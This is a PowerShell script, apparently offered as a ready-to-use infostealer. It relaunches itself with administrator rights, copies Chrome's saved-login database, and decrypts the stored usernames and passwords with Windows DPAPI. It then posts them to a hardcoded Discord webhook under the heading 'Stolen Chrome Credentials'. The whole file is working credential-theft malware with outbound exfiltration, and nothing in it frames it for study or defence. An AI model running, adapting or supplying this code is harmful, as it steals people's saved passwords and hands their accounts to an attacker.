# Self-elevate PowerShell script
If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{
    # Create a new process as administrator
    $newProcess = New-Object System.Diagnostics.ProcessStartInfo "PowerShell";
    $newProcess.Arguments = "-File `"" + $PSCommandPath + "`"";
    $newProcess.Verb = "runAs";
    [System.Diagnostics.Process]::Start($newProcess) | Out-Null
    Exit
}

# Replace this with your Discord Webhook URL
$webhookURL = "https://discord.com/api/webhooks/1302032038563414147/o5jjFWbs_6-_rTlE-BqdFf7Gayo5DkW8Cj2HXdpWr9eiOkfQv1N_iR-el8CvliJCNSMg"

# Function to decrypt Chrome passwords
function Get-ChromePasswords {
    $localAppData = [System.Environment]::GetFolderPath('LocalApplicationData')
    $chromePath = "$localAppData\Google\Chrome\User Data\Default\Login Data"
    $tempPath = "$env:TEMP\LoginData.db"

    # Copy the database to avoid locking issues
    Copy-Item $chromePath $tempPath

    # Open the SQLite database and extract login details
    $query = "SELECT origin_url, username_value, password_value FROM logins"
    $connection = New-Object System.Data.SQLite.SQLiteConnection "Data Source=$tempPath;Version=3;"
    $connection.Open()
    $command = $connection.CreateCommand()
    $command.CommandText = $query
    $reader = $command.ExecuteReader()

    $result = @()
    while ($reader.Read()) {
        $url = $reader["origin_url"]
        $username = $reader["username_value"]
        $passwordBlob = $reader["password_value"]

        # Decrypt the password using Windows DPAPI
        $password = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($passwordBlob, $null, 'CurrentUser'))

        $result += [PSCustomObject]@{
            URL      = $url
            Username = $username
            Password = $password
        }
    }

    $connection.Close()
    Remove-Item $tempPath
    return $result
}

# Format and send the results to Discord via Webhook
function Send-ToDiscord {
    param ($data)

    $json = @"
    {
        "content": "Stolen Chrome Credentials",
        "embeds": [{
            "title": "Credentials Found",
            "description": "$data"
        }]
    }
"@
    Invoke-RestMethod -Uri $webhookURL -Method POST -Body $json -ContentType 'application/json'
}

# Main Execution
$credentials = Get-ChromePasswords
if ($credentials.Count -gt 0) {
    $formatted = $credentials | Out-String
    Send-ToDiscord -data $formatted
} else {
    Write-Output "No credentials found"
}
